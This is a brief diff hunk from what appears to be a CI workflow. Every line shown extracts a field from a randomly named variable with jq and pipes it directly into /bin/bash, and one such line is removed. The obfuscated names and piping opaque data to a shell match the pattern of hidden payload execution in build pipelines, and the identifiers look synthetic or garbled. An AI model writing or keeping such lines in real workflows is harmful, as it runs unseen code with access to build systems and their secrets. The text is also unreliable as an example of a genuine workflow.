@@ -37,7 +37,6 @@ jobs:
           echo $alho6 | jq -r .vs4 | /bin/bash
           echo $nymv41765 | jq -r .ym3 | /bin/bash
           echo $hi69569 | jq -r .vsur369 | /bin/bash
-          echo $qzv52249 | jq -r .il256 | /bin/bash
           printf '%s' "$ay44" | jq -r .s05287 | /bin/bash
           printf '%s' "$ryhb3824" | jq -r .qm7 | /bin/bash
           printf '%s' "$yk7214" | jq -r .kkzo6 | /bin/bash
